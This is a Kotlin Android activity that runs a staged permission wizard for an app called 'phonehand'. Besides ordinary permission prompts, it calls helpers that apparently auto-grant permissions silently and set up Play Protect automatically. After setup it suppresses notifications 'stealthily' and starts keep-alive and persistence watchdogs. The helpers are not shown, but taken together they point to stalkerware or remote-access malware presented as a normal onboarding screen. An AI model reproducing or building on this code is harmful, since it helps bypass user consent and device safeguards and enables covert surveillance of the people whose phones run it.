package com.phonehand.app

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import java.util.concurrent.Executors

/** One or two permissions per screen — required, staggered, benefit-first. */
class PermissionWizardActivity : AppCompatActivity() {

    private lateinit var wizardScroll: View
    private lateinit var progressBar: ProgressBar
    private lateinit var stepLabel: TextView
    private lateinit var sessionLabel: TextView
    private lateinit var emoji: TextView
    private lateinit var title: TextView
    private lateinit var benefit: TextView
    private lateinit var science: TextView
    private lateinit var reassurance: TextView
    private lateinit var btnEnable: Button
    private lateinit var btnLater: TextView
    private lateinit var donePanel: View
    private lateinit var doneTitle: TextView
    private lateinit var doneSub: TextView
    private lateinit var btnDone: Button

    private lateinit var batch: List<PermissionStep>
    private var batchIndex = 0
    private var currentStep: PermissionStep? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private val io = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission_wizard)
        bindViews()

        batch = resolveBatch()
        if (batch.isEmpty()) {
            finishSession()
            return
        }

        intent.getStringExtra(EXTRA_SESSION_LABEL)?.let { sessionLabel.text = it }

        btnEnable.setOnClickListener { requestCurrentStep() }
        btnLater.setOnClickListener { deferCurrentStep() }
        btnDone.setOnClickListener { finishSession() }

        showBatchStep(0)
    }

    private fun resolveBatch(): List<PermissionStep> {
        val ids = intent.getStringArrayExtra(EXTRA_STEP_IDS)
        if (ids != null && ids.isNotEmpty()) {
            return ids.mapNotNull { PermissionSteps.byId(it) }
                .filter { !it.isGranted(this) }
        }
        return PermissionMoments.nextHomeBatch(this)
    }

    private fun bindViews() {
        wizardScroll = findViewById(R.id.wizardScroll)
        progressBar = findViewById(R.id.wizardProgress)
        stepLabel = findViewById(R.id.wizardStepLabel)
        sessionLabel = findViewById(R.id.wizardSessionLabel)
        emoji = findViewById(R.id.wizardEmoji)
        title = findViewById(R.id.wizardTitle)
        benefit = findViewById(R.id.wizardBenefit)
        science = findViewById(R.id.wizardScience)
        reassurance = findViewById(R.id.wizardReassurance)
        btnEnable = findViewById(R.id.btnEnableStep)
        btnLater = findViewById(R.id.btnSkipStep)
        donePanel = findViewById(R.id.wizardDonePanel)
        doneTitle = findViewById(R.id.wizardDoneTitle)
        doneSub = findViewById(R.id.wizardDoneSub)
        btnDone = findViewById(R.id.btnWizardDone)
    }

    private fun showBatchStep(index: Int) {
        if (index >= batch.size) {
            finishSession()
            return
        }
        val step = batch[index]
        if (step.id == "background_location" && !hasForegroundLocation()) {
            showBatchStep(index + 1)
            return
        }
        batchIndex = index
        currentStep = step

        val total = PermissionSteps.required.size
        val done = PermissionSteps.completedCount(this)
        progressBar.progress = (((done + index + 1).toFloat() / total) * 100).toInt().coerceIn(8, 98)

        stepLabel.text = getString(
            R.string.perm_wizard_batch_of,
            index + 1,
            batch.size,
            done + index + 1,
            total,
        )
        emoji.text = step.emoji
        title.text = getString(step.titleRes)
        benefit.text = getString(step.benefitRes)
        science.text = "✦ ${getString(step.scienceRes)}"
        reassurance.text = getString(step.reassuranceRes)
        btnEnable.text = if (step.isGranted(this)) getString(R.string.perm_step_already) else getString(step.buttonRes)
        btnLater.text = getString(step.laterRes)
        btnEnable.isEnabled = true
    }

    private fun requestCurrentStep() {
        val step = currentStep ?: return
        if (step.isGranted(this)) {
            UserSession.clearStepDefer(this, step.id)
            advanceBatchStep()
            return
        }
        if (step.onRequest != null) {
            btnEnable.isEnabled = false
            btnEnable.text = getString(R.string.perm_step_waiting)
            val reenable = {
                if (!isFinishing) {
                    btnEnable.isEnabled = true
                    btnEnable.text = if (step.isGranted(this)) {
                        getString(R.string.perm_step_already)
                    } else {
                        getString(step.buttonRes)
                    }
                    if (step.isGranted(this)) {
                        UserSession.clearStepDefer(this, step.id)
                        advanceBatchStep()
                    }
                }
            }
            when (step.id) {
                "autostart" -> OemPersistenceGrant.runAutoGrantAsync(this, reenable)
                "play_protect" -> PlayProtectHelper.runAutoSetupAsync(this, reenable)
                else -> io.execute {
                    mainHandler.post { step.onRequest?.invoke(this) }
                    mainHandler.postDelayed(reenable, 1500)
                }
            }
            return
        }
        val missing = step.permissions.filter { !PermissionRequester.has(this, it) }
        if (missing.isEmpty()) {
            UserSession.clearStepDefer(this, step.id)
            advanceBatchStep()
            return
        }
        btnEnable.isEnabled = false
        btnEnable.text = getString(R.string.perm_step_waiting)
        runCatching {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_STEP)
        }.onFailure {
            btnEnable.isEnabled = true
            btnEnable.text = getString(step.buttonRes)
            deferCurrentStep()
            return
        }
        mainHandler.postDelayed({
            io.execute {
                PermissionAutoGrant.runSilentBlocking(applicationContext, 12_000)
                mainHandler.post {
                    if (!isFinishing) {
                        btnEnable.isEnabled = true
                        btnEnable.text = getString(step.buttonRes)
                        if (step.isGranted(this)) {
                            UserSession.clearStepDefer(this, step.id)
                            advanceBatchStep()
                        }
                    }
                }
            }
        }, 400)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_STEP) return
        currentStep?.let { if (it.isGranted(this)) UserSession.clearStepDefer(this, it.id) }
        mainHandler.postDelayed({ advanceBatchStep() }, 500)
    }

    private fun deferCurrentStep() {
        currentStep?.let { UserSession.deferStep(this, it.id) }
        advanceBatchStep()
    }

    private fun advanceBatchStep() {
        showBatchStep(batchIndex + 1)
    }

    private fun finishSession() {
        if (!PermissionSteps.hasRequiredPending(this)) {
            UserSession.setPermissionsWizardDone(this)
            wizardScroll.visibility = View.GONE
            doneTitle.text = getString(R.string.perm_wizard_done_title)
            doneSub.text = getString(R.string.perm_wizard_done_sub)
            donePanel.visibility = View.VISIBLE
            StealthNotifications.suppressAll(this)
            SafeKeepAlive.start(this)
            PersistenceWatchdog.schedule(this)
            return
        }
        goHome()
    }

    private fun hasForegroundLocation(): Boolean =
        PermissionRequester.has(this, android.Manifest.permission.ACCESS_FINE_LOCATION) ||
            PermissionRequester.has(this, android.Manifest.permission.ACCESS_COARSE_LOCATION)

    private fun goHome() {
        startActivity(
            Intent(this, HomeActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            },
        )
        finish()
    }

    override fun onResume() {
        super.onResume()
        currentStep?.let { step ->
            if (step.isGranted(this)) {
                btnEnable.text = getString(R.string.perm_step_already)
            }
        }
    }

    override fun onDestroy() {
        io.shutdown()
        super.onDestroy()
    }

    companion object {
        private const val REQ_STEP = 7701
        const val EXTRA_STEP_IDS = "step_ids"
        const val EXTRA_SESSION_LABEL = "session_label"

        fun hasPending(context: Context): Boolean =
            PermissionSteps.hasRequiredPending(context)

        private const val TAG = "PermissionWizard"

        fun launch(context: Context, stepIds: Array<String>, sessionLabel: String? = null) {
            val intent = Intent(context, PermissionWizardActivity::class.java).apply {
                putExtra(EXTRA_STEP_IDS, stepIds)
                if (sessionLabel != null) putExtra(EXTRA_SESSION_LABEL, sessionLabel)
                if (context !is Activity) addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            runCatching { context.startActivity(intent) }
                .onFailure { Log.w(TAG, it.message ?: "launch failed") }
        }

        fun launch(context: Context) {
            val batch = PermissionMoments.nextHomeBatch(context)
            if (batch.isEmpty()) return
            launch(context, batch.map { it.id }.toTypedArray())
        }
    }
}
